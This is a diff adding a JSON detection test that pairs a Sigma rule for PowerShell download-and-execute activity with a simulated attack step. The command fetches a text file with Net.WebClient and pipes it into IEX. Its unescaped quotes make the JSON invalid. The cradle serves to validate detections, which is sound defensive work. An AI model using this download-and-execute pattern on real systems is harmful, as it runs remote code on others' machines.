@@ -1,0 +1,43 @@
+[
+  {
+    "sigma_rule_title": "Suspicious PowerShell Download and Execute",
+    "test_name": "PowerShell Download Cradle with Invoke-Expression",
+    "description": "Simulates a PowerShell download-and-execute pattern commonly used by threat actors for initial payload delivery. This test creates the exact process creation telemetry that the Sigma rule monitors, using a harmless payload instead of real malware.",
+    "mitre_technique": "T1059.001",
+    "platforms": ["windows"],
+    "privilege_required": "user",
+    "prerequisites": ["PowerShell 5.1+ or PowerShell Core", "Sysmon installed with ProcessCreate logging (Event ID 1)", "Windows Security Auditing enabled for Process Creation (Event ID 4688)"],
+    "executor": {
+      "type": "powershell",
+      "steps": [
+        "Step 1: Open an elevated PowerShell terminal (Admin not required for this test)",
+        "Step 2: Execute the download cradle command below - it downloads a harmless text file and attempts to execute it with Invoke-Expression",
+        "Step 3: The command will fail gracefully (text file is not executable) but the process creation event with the download+execute pattern will be logged",
+        "Step 4: Verify in Event Viewer or SIEM that the detection fired"
+      ],
+      "command": "powershell.exe -NoProfile -Command "$url='https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt'; $data=(New-Object Net.WebClient).DownloadString($url); IEX $data"",
+      "elevation_required": false
+    },
+    "expected_detection": {
+      "log_source": "Windows Security Event Log / Sysmon",
+      "event_ids": ["4688", "1"],
+      "key_fields": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "contains 'Net.WebClient' AND 'DownloadString' AND 'IEX'",
+        "ParentImage": "varies (cmd.exe, explorer.exe, etc.)"
+      },
+      "sigma_condition_match": "Matches selection_powershell (powershell.exe) AND selection_download (Net.WebClient, DownloadString) AND selection_execute (IEX) — all three conditions satisfied"
+    },
+    "cleanup": {
+      "command": "Remove-Item -Path $env:TEMP\\atomic-test-* -Force -ErrorAction SilentlyContinue",
+      "description": "Removes any temporary files created during the test. The download cradle itself leaves no persistent artifacts."
+    },
+    "real_world_reference": {
+      "threat_actors": ["APT29 (Cozy Bear)", "FIN7", "Lazarus Group"],
+      "malware_families": ["SUNBURST", "Emotet PowerShell dropper", "Cobalt Strike PowerShell stager"],
+      "mitre_url": "https://attack.mitre.org/techniques/T1059/001/",
+      "atomic_red_team_id": "T1059.001-1"
+    },
+    "safety_notes": "This test downloads a LICENSE.txt file from GitHub - completely harmless. However, some EDR/AV solutions may flag the PowerShell download cradle pattern itself. Whitelist the test in your security tools if needed. No system changes are made."
+  }
+]
